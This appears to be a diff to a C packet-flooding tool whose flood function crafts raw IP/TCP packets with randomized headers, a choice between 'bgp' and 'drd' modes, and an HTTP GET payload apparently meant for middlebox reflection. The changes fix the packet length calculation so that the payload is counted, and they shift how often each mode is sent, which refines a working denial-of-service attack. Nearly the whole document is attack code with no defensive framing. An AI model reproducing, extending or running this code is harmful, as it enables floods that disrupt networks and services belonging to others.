@@ -18,7 +18,7 @@
 
 /*gcc drdMultiList.c -pthread -g3 -O2 -o drdo -lm*/
 
-static const char middlePayload[] = "GET / HTTP/1.1\r\nHost: example.com\r\nAccept-Encoding: identity\r\n\r\n";
+static const char middlePayload[] = "GET /./ HTTP/1.1\r\nHost: example.com\r\n\r\n";
 
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
@@ -309,10 +309,13 @@ void *flood(void *par1)
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
 		tcph->seq = htonl(randnum(1000000, 9999999));
 
-		int bpgOrDrd = randnum(0, 1);
+		int bpgOrDrd = randnum(0, 2);
 		int mBox = randnum(0, 1);
 
-		if (bpgOrDrd == 1)
+		/**
+		 * 1:3 chance to send bgp
+		 */
+		if (bpgOrDrd == 0)
 		{
 			if (floodport == 0)
 			{
@@ -391,7 +394,7 @@ void *flood(void *par1)
 					tcph->ack = 1;
 					memcpy((void *)tcph + sizeof(struct tcphdr), middlePayload, sizeof(middlePayload));
 					tcph->doff = 5;
-					iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+					iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(middlePayload);
 					iph->check = csum((unsigned short *)datagram, iph->tot_len);
 					tcph->check = tcpcsum(iph, tcph, sizeof(middlePayload));
 				}
@@ -420,7 +423,7 @@ void *flood(void *par1)
 					tcph->ack = 1;
 					memcpy((void *)tcph + sizeof(struct tcphdr), middlePayload, sizeof(middlePayload));
 					tcph->doff = 5;
-					iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+					iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(middlePayload);
 					iph->check = csum((unsigned short *)datagram, iph->tot_len);
 					tcph->check = tcpcsum(iph, tcph, sizeof(middlePayload));
 				}
@@ -449,7 +452,7 @@ void *flood(void *par1)
 					tcph->ack = 1;
 					memcpy((void *)tcph + sizeof(struct tcphdr), middlePayload, sizeof(middlePayload));
 					tcph->doff = 5;
-					iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+					iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(middlePayload);
 					iph->check = csum((unsigned short *)datagram, iph->tot_len);
 					tcph->check = tcpcsum(iph, tcph, sizeof(middlePayload));
 				}
@@ -478,7 +481,7 @@ void *flood(void *par1)
 					tcph->ack = 1;
 					memcpy((void *)tcph + sizeof(struct tcphdr), middlePayload, sizeof(middlePayload));
 					tcph->doff = 5;
-					iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+					iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(middlePayload);
 					iph->check = csum((unsigned short *)datagram, iph->tot_len);
 					tcph->check = tcpcsum(iph, tcph, sizeof(middlePayload));
 				}
@@ -507,7 +510,7 @@ void *flood(void *par1)
 					tcph->ack = 1;
 					memcpy((void *)tcph + sizeof(struct tcphdr), middlePayload, sizeof(middlePayload));
 					tcph->doff = 5;
-					iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+					iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(middlePayload);
 					iph->check = csum((unsigned short *)datagram, iph->tot_len);
 					tcph->check = tcpcsum(iph, tcph, sizeof(middlePayload));
 				}
